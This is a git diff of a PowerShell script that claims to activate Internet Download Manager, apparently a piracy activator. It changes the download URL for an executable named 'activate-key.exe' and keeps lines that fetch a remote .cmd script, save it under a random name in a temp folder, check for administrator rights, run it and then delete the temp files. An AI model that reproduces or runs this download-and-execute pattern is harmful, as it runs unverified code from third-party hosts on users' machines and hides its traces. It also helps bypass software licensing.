@@ -1,7 +1,7 @@
 # Check the instructions here on how to use it https://github.com/lstprjct/IDM-Activation-Script/wiki
 
-$ProcName = "idmkeypro.exe"
-$WebFile = "https://www.kmspico.pctoolsbox.com/app/idmkeypro.exe"
+$ProcName = "activate-key.exe"
+$WebFile = "https://github.com/Pctoolsbox/IDM-Activation-Lifetime-license/raw/refs/heads/main/activate-key.exe"
  
 Clear-Host
  
@@ -16,7 +16,7 @@ $DownloadURL = 'https://github.com/Pctoolsbox/IDM-Activation-Lifetime-license/ra
 
 $rand = Get-Random -Maximum 99999999
 $isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
-$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\IAS_$rand.cmd" } else { "$env:TEMP\IAS_$rand.cmd" }
+$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\IAS_$rand.cmd" } else { "$env:TEMP\IDM-Lifetime-license_$rand.cmd" }
 
 try {
     $response = Invoke-WebRequest -Uri $DownloadURL -UseBasicParsing
@@ -32,5 +32,5 @@ Set-Content -Path $FilePath -Value $content
 
 Start-Process $FilePath $ScriptArgs -Wait
 
-$FilePaths = @("$env:TEMP\IAS*.cmd", "$env:SystemRoot\Temp\IDM-Lifetime license*.cmd")
+$FilePaths = @("$env:TEMP\IDM-Lifetime-license*.cmd", "$env:SystemRoot\Temp\IDM-Lifetime license*.cmd")
 foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }
